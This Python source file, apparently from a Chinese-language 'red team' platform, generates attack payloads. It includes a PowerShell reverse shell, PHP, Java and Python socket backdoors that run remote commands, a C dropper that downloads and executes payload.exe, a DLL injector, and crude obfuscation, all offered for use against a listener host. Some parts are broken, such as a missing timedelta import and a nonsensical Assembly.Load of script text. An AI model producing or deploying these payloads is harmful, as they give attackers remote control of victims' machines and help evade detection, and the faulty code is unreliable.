#!/usr/bin/env python3
"""
Dragon-V RVOP Payload Generator
专业红队作战平台 - 载荷生成器
生成各种类型的恶意载荷用于授权测试
"""

import os
import json
import base64
import hashlib
import secrets
import subprocess
import shutil
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
import zipfile
import tempfile

@dataclass
class PayloadConfig:
    payload_type: str
    platform: str
    architecture: str
    listener_host: str
    listener_port: int
    encoder: str = "base64"
    obfuscate: bool = True
    custom_code: Optional[str] = None

class PayloadGenerator:
    def __init__(self, output_dir: str = "payloads"):
        self.output_dir = output_dir
        self.payloads_dir = os.path.join(output_dir, "generated")
        self.templates_dir = os.path.join(output_dir, "templates")

        # 创建必要的目录
        os.makedirs(self.payloads_dir, exist_ok=True)
        os.makedirs(self.templates_dir, exist_ok=True)

        # 初始化载荷模板
        self.init_templates()

    def init_templates(self):
        """初始化载荷模板"""
        # PowerShell载荷模板
        ps_template = '''
# PowerShell Reverse Shell Generator
param (
    [string]$host = "{host}",
    [int]$port = {port},
    [string]$encoder = "base64"
)

function Invoke-ReverseShell {{
    $client = New-Object System.Net.Sockets.TcpClient("{host}", {port})
    $stream = $client.GetStream()

    while ($client.Connected) {{
        $buffer = New-Object byte[] 1024
        $read = $stream.Read($buffer, 0, $buffer.Length)

        if ($read -eq 0) {{
            break
        }}

        $command = [Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        $result = Invoke-Expression $command 2>&1

        $resultBytes = [Text.Encoding]::ASCII.GetBytes($result)
        $stream.Write($resultBytes, 0, $resultBytes.Length)
        $stream.Flush()
    }}

    $client.Close()
}}

if ($encoder -eq "base64") {{
    $shellCode = [Convert]::FromBase64String("{encoded_shell}")
    $assembly = [AppDomain]::CurrentDomain.Load($shellCode)
    $entry = $assembly.EntryPoint
    $entry.Invoke($null)
}} else {{
    Invoke-ReverseShell
}}
'''

        # WebShell模板 (PHP)
        php_template = '''
<?php
// PHP WebShell Generator
@error_reporting(0);
@set_time_limit(0);

class C2Shell {{
    private $host = "{host}";
    private $port = {port};
    private $timeout = 30;

    public function __construct() {{
        $this->connect();
    }}

    private function connect() {{
        $socket = @fsockopen($this->host, $this->port, $errno, $errstr, $this->timeout);

        if (!$socket) {{
            die("Connection failed: $errstr ($errno)");
        }}

        while (true) {{
            $input = $this->readData($socket);

            if ($input === false) {{
                break;
            }}

            $output = $this->executeCommand($input);
            $this->sendData($socket, $output);
        }}

        fclose($socket);
    }}

    private function readData($socket) {{
        $data = '';
        while (!feof($socket)) {{
            $char = fread($socket, 1);
            if ($char === "\0") break;
            $data .= $char;
        }}
        return $data;
    }}

    private function sendData($socket, $data) {{
        $data .= "\0";
        fwrite($socket, $data);
    }}

    private function executeCommand($command) {{
        $command = trim($command);

        if (empty($command)) {{
            return "";
        }}

        if ($command === "exit") {{
            die();
        }}

        $output = shell_exec($command);
        return $output ?: "Command executed but no output";
    }}
}}

new C2Shell();
?>
'''

        # Java后门模板
        java_template = '''
import java.io.*;
import java.net.*;
import java.util.Base64;

public class JavaBackdoor {{
    private static String HOST = "{host}";
    private static int PORT = {port};
    private static int TIMEOUT = 30000;

    public static void main(String[] args) {{
        try {{
            Socket socket = new Socket(HOST, PORT);
            socket.setSoTimeout(TIMEOUT);

            BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter output = new PrintWriter(socket.getOutputStream(), true);

            while (true) {{
                String command = input.readLine();
                if (command == null) break;

                String result = executeCommand(command);
                output.println(result);
            }}

            socket.close();
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private static String executeCommand(String command) {{
        try {{
            Process process = Runtime.getRuntime().exec(new String[]{{"sh", "-c", command}});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();

            String line;
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}

            int exitCode = process.waitFor();
            return output.toString() + "Exit code: " + exitCode;
        }} catch (Exception e) {{
            return "Error: " + e.getMessage();
        }}
    }}
}}
'''

        # 保存模板
        templates = {
            'powershell': ps_template,
            'php': php_template,
            'java': java_template
        }

        for template_name, template_content in templates.items():
            template_path = os.path.join(self.templates_dir, f"{template_name}.template")
            if not os.path.exists(template_path):
                with open(template_path, 'w', encoding='utf-8') as f:
                    f.write(template_content)

    def generate_payload(self, config: PayloadConfig) -> Dict[str, Any]:
        """生成载荷"""
        try:
            payload_id = secrets.token_urlsafe(16)
            timestamp = datetime.now().isoformat()

            # 根据载荷类型生成载荷
            if config.payload_type == "powershell":
                payload_data = self.generate_powershell_payload(config)
                file_extension = "ps1"
            elif config.payload_type == "php_webshell":
                payload_data = self.generate_php_webshell(config)
                file_extension = "php"
            elif config.payload_type == "java_backdoor":
                payload_data = self.generate_java_backdoor(config)
                file_extension = "java"
            elif config.payload_type == "python_backdoor":
                payload_data = self.generate_python_backdoor(config)
                file_extension = "py"
            elif config.payload_type == "exe_dropper":
                payload_data = self.generate_exe_dropper(config)
                file_extension = "exe"
            elif config.payload_type == "dll_inject":
                payload_data = self.generate_dll_inject(config)
                file_extension = "dll"
            else:
                raise ValueError(f"不支持的载荷类型: {config.payload_type}")

            # 混淆和加密
            if config.obfuscate:
                payload_data = self.obfuscate_payload(payload_data, config.payload_type)

            # 生成文件路径
            filename = f"{payload_id}.{file_extension}"
            filepath = os.path.join(self.payloads_dir, filename)

            # 保存载荷文件
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(payload_data)

            # 生成元数据
            metadata = {
                "payload_id": payload_id,
                "payload_type": config.payload_type,
                "platform": config.platform,
                "architecture": config.architecture,
                "filename": filename,
                "filepath": filepath,
                "host": config.listener_host,
                "port": config.listener_port,
                "encoder": config.encoder,
                "obfuscate": config.obfuscate,
                "created_at": timestamp,
                "size": len(payload_data)
            }

            # 保存元数据
            metadata_path = os.path.join(self.payloads_dir, f"{payload_id}.json")
            with open(metadata_path, 'w', encoding='utf-8') as f:
                json.dump(metadata, f, indent=2, ensure_ascii=False)

            logger = logging.getLogger(__name__)
            logger.info(f"载荷生成成功: {payload_id} ({config.payload_type})")

            return {
                "status": "success",
                "payload_id": payload_id,
                "metadata": metadata,
                "payload": payload_data if not config.obfuscate else "混淆后的载荷已保存到文件"
            }

        except Exception as e:
            logger = logging.getLogger(__name__)
            logger.error(f"载荷生成失败: {e}")
            return {
                "status": "error",
                "error": str(e)
            }

    def generate_powershell_payload(self, config: PayloadConfig) -> str:
        """生成PowerShell载荷"""
        template_path = os.path.join(self.templates_dir, "powershell.template")

        with open(template_path, 'r', encoding='utf-8') as f:
            template = f.read()

        # 生成PowerShell代码
        ps_code = f'''
# PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TcpClient("{config.listener_host}", {config.listener_port})
$stream = $client.GetStream()
[byte[]]$buffer = 0..65535|%{{0}}
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''

        # 如果需要编码
        if config.encoder == "base64":
            encoded_shell = base64.b64encode(ps_code.encode()).decode()
            return template.format(
                host=config.listener_host,
                port=config.listener_port,
                encoded_shell=encoded_shell
            )

        return template.format(
            host=config.listener_host,
            port=config.listener_port,
            encoded_shell=""
        )

    def generate_php_webshell(self, config: PayloadConfig) -> str:
        """生成PHP WebShell"""
        template_path = os.path.join(self.templates_dir, "php.template")

        with open(template_path, 'r', encoding='utf-8') as f:
            template = f.read()

        return template.format(
            host=config.listener_host,
            port=config.listener_port
        )

    def generate_java_backdoor(self, config: PayloadConfig) -> str:
        """生成Java后门"""
        template_path = os.path.join(self.templates_dir, "java.template")

        with open(template_path, 'r', encoding='utf-8') as f:
            template = f.read()

        return template.format(
            host=config.listener_host,
            port=config.listener_port
        )

    def generate_python_backdoor(self, config: PayloadConfig) -> str:
        """生成Python后门"""
        python_code = f'''
#!/usr/bin/env python3
import socket
import subprocess
import threading
import base64
import os

class PythonBackdoor:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            self.socket.connect((self.host, self.port))
            self.receive_commands()
        except Exception as e:
            print(f"连接失败: {{e}}")

    def receive_commands(self):
        while True:
            try:
                command = self.socket.recv(1024).decode('utf-8')
                if command.strip() == 'exit':
                    break

                result = self.execute_command(command)
                self.socket.send(result.encode('utf-8'))
            except Exception as e:
                print(f"错误: {{e}}")
                break

        self.socket.close()

    def execute_command(self, command):
        try:
            if command.strip() == 'download':
                filename = input("输入要下载的文件名: ")
                with open(filename, 'rb') as f:
                    data = f.read()
                    encoded = base64.b64encode(data).decode()
                    return encoded
            elif command.strip() == 'upload':
                filename = input("输入要上传的文件名: ")
                data = input("输入Base64编码的文件内容: ")
                decoded = base64.b64decode(data)
                with open(filename, 'wb') as f:
                    f.write(decoded)
                return f"文件 {{filename}} 上传成功"
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout + result.stderr
        except Exception as e:
            return f"错误: {{e}}"

if __name__ == "__main__":
    backdoor = PythonBackdoor("{config.listener_host}", {config.listener_port})
    backdoor.connect()
'''
        return python_code

    def generate_exe_dropper(self, config: PayloadConfig) -> bytes:
        """生成可执行文件加载器"""
        # 这是一个简单的可执行文件生成器
        # 在实际使用中，你会使用更复杂的工具如Cobalt Strike或Metasploit

        c_code = '''
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

int main() {
    HINTERNET hInternet, hFile;
    BOOL bResult;
    DWORD bytesRead, fileSize;
    HANDLE hFileLocal;
    BYTE* buffer;

    // 下载远程文件
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hFile = InternetOpenUrl(hInternet, "http://example.com/payload.exe", NULL, 0,
                          INTERNET_FLAG_RELOAD, 0);

    if (hFile == NULL) {
        printf("下载失败\\n");
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 获取文件大小
    fileSize = 0;
    bResult = HttpQueryInfo(hFile, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
                          &fileSize, NULL, NULL);

    if (bResult && fileSize > 0) {
        // 分配缓冲区
        buffer = (BYTE*)malloc(fileSize);
        if (buffer) {
            // 读取文件
            bytesRead = 0;
            bResult = InternetReadFile(hFile, buffer, fileSize, &bytesRead);

            if (bResult && bytesRead == fileSize) {
                // 保存到本地
                hFileLocal = CreateFile("payload.exe", GENERIC_WRITE, 0, NULL,
                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

                if (hFileLocal != INVALID_HANDLE_VALUE) {
                    WriteFile(hFileLocal, buffer, fileSize, &bytesRead, NULL);
                    CloseHandle(hFileLocal);
                    printf("文件下载成功\\n");
                }
            }
            free(buffer);
        }
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    // 执行下载的文件
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcess("payload.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    return 0;
}
'''

        # 在实际应用中，这里会调用编译器生成EXE文件
        # 现在，我们返回一个简单的模拟
        return c_code.encode('utf-8')

    def generate_dll_inject(self, config: PayloadConfig) -> str:
        """生成DLL注入器"""
        dll_code = f'''
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD GetProcessId(const char* processName) {{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {{
        do {{
            if (strcmp(process.szExeFile, processName) == 0) {{
                CloseHandle(snapshot);
                return process.th32ProcessID;
            }}
        }} while (Process32Next(snapshot, &process));
    }}

    CloseHandle(snapshot);
    return 0;
}}

int main(int argc, char* argv[]) {{
    if (argc != 3) {{
        printf("用法: %s <进程名> <DLL路径>\\n", argv[0]);
        return 1;
    }}

    const char* targetProcess = argv[1];
    const char* dllPath = argv[2];

    DWORD processId = GetProcessId(targetProcess);
    if (processId == 0) {{
        printf("找不到进程: %s\\n", targetProcess);
        return 1;
    }}

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {{
        printf("无法打开进程\\n");
        return 1;
    }}

    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
    LPVOID dllPathAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    WriteProcessMemory(hProcess, dllPathAddr, (LPVOID)dllPath, strlen(dllPath), NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr,
                                       dllPathAddr, 0, NULL);

    if (hThread) {{
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }}

    VirtualFreeEx(hProcess, dllPathAddr, strlen(dllPath), MEM_RELEASE);
    CloseHandle(hProcess);

    printf("DLL注入成功\\n");
    return 0;
}}
'''
        return dll_code

    def obfuscate_payload(self, payload: str, payload_type: str) -> str:
        """混淆载荷"""
        if payload_type == "powershell":
            # PowerShell混淆
            # 1. 变量名混淆
            payload = payload.replace('$client', '$' + secrets.token_hex(4))
            payload = payload.replace('$stream', '$' + secrets.token_hex(4))
            payload = payload.replace('$buffer', '$' + secrets.token_hex(4))
            payload = payload.replace('$sendback', '$' + secrets.token_hex(4))
            payload = payload.replace('$sendback2', '$' + secrets.token_hex(4))
            payload = payload.replace('$sendbyte', '$' + secrets.token_hex(4))

            # 2. 字符串加密
            payload = payload.replace('"', "' + [char] + '")
            payload = payload.replace("'", "[char]")

        elif payload_type == "php":
            # PHP混淆
            # 1. 函数名混淆
            payload = payload.replace('fopen', self.random_string(8))
            payload = payload.replace('fwrite', self.random_string(8))
            payload = payload.replace('fgets', self.random_string(8))
            payload = payload.replace('feof', self.random_string(8))

        elif payload_type == "java":
            # Java混淆
            payload = payload.replace('Socket', self.random_string(8))
            payload = payload.replace('BufferedReader', self.random_string(8))
            payload = payload.replace('PrintWriter', self.random_string(8))
            payload = payload.replace('Runtime', self.random_string(8))

        return payload

    def random_string(self, length: int) -> str:
        """生成随机字符串"""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        return ''.join(secrets.choice(chars) for _ in range(length))

    def list_payloads(self) -> List[Dict[str, Any]]:
        """列出所有生成的载荷"""
        payloads = []

        for filename in os.listdir(self.payloads_dir):
            if filename.endswith('.json'):
                payload_id = filename[:-5]
                metadata_path = os.path.join(self.payloads_dir, filename)

                try:
                    with open(metadata_path, 'r', encoding='utf-8') as f:
                        metadata = json.load(f)
                        payloads.append(metadata)
                except Exception as e:
                    print(f"读取载荷元数据失败: {e}")

        return payloads

    def get_payload(self, payload_id: str) -> Optional[Dict[str, Any]]:
        """获取特定载荷"""
        metadata_path = os.path.join(self.payloads_dir, f"{payload_id}.json")

        if not os.path.exists(metadata_path):
            return None

        try:
            with open(metadata_path, 'r', encoding='utf-8') as f:
                metadata = json.load(f)
                return metadata
        except Exception as e:
            print(f"读取载荷元数据失败: {e}")
            return None

    def cleanup_old_payloads(self, days: int = 7):
        """清理旧的载荷文件"""
        cutoff_time = datetime.now() - timedelta(days=days)

        for filename in os.listdir(self.payloads_dir):
            filepath = os.path.join(self.payloads_dir, filename)

            if os.path.getmtime(filepath) < cutoff_time.timestamp():
                os.remove(filepath)
                print(f"删除旧载荷: {filename}")

# 配置日志
import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

if __name__ == "__main__":
    # 示例使用
    generator = PayloadGenerator()

    # 生成PowerShell载荷
    ps_config = PayloadConfig(
        payload_type="powershell",
        platform="windows",
        architecture="x64",
        listener_host="192.168.1.100",
        listener_port=4444
    )

    result = generator.generate_payload(ps_config)
    print("PowerShell载荷生成结果:", result)

    # 生成PHP WebShell
    php_config = PayloadConfig(
        payload_type="php_webshell",
        platform="linux",
        architecture="x64",
        listener_host="192.168.1.100",
        listener_port=8080
    )

    result = generator.generate_payload(php_config)
    print("PHP WebShell生成结果:", result)

    # 列出所有载荷
    payloads = generator.list_payloads()
    print("所有载荷:", json.dumps(payloads, indent=2, ensure_ascii=False))